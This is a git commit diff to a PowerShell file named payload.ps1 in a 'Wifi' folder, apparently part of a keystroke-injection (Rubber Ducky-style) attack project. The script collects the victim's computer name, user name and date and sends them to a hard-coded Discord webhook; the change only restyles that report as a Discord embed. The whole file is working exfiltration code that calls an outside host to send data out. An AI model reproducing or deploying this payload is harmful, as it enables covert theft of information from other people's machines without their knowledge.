b0e03b47929c57a24f01f834e9157fe0aa90422d
Red-Ducky <galaxy2yt2.0@gmail.com>
2026-05-06 08:54:24 +0200

    Update payload.ps1

--- Wifi/payload.ps1
+++ Wifi/payload.ps1
@@ -3,7 +3,19 @@ $webhookUrl = "https://discord.com/api/webhooks/1501460061439004732/fE-P3g0HI2ha
 $machine     = $env:COMPUTERNAME
 $utilisateur = $env:USERNAME
 $date        = Get-Date -Format "yyyy-MM-dd HH:mm"
+# Ajoute ici tes propres variables...
 
-$body = "{`"content`": `"Machine: $machine | User: $utilisateur | Date: $date`"}"
+$body = "{
+  `"username`": `"MonScript`",
+  `"embeds`": [{
+    `"title`": `"Nouveau rapport`",
+    `"color`": 3447003,
+    `"fields`": [
+      { `"name`": `"Machine`",     `"value`": `"$machine`",     `"inline`": true },
+      { `"name`": `"Utilisateur`", `"value`": `"$utilisateur`", `"inline`": true },
+      { `"name`": `"Date`",        `"value`": `"$date`",        `"inline`": false }
+    ]
+  }]
+}"
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
